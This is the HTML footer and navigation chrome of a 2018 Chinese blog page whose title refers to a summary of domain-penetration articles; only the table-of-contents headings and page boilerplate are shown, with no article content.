      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-number">1.</span> <span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01正文"><span class="toc-number">2.</span> <span class="toc-text">0x01正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02相关资料"><span class="toc-number">3.</span> <span class="toc-text">0x02相关资料</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&text=细读域渗透文章得到的总结"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&is_video=false&description=细读域渗透文章得到的总结"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=细读域渗透文章得到的总结&body=Check out this article: http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&name=细读域渗透文章得到的总结&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 九世
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/422926799">Proyectos</a></li>
         
          <li><a href="/Search">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


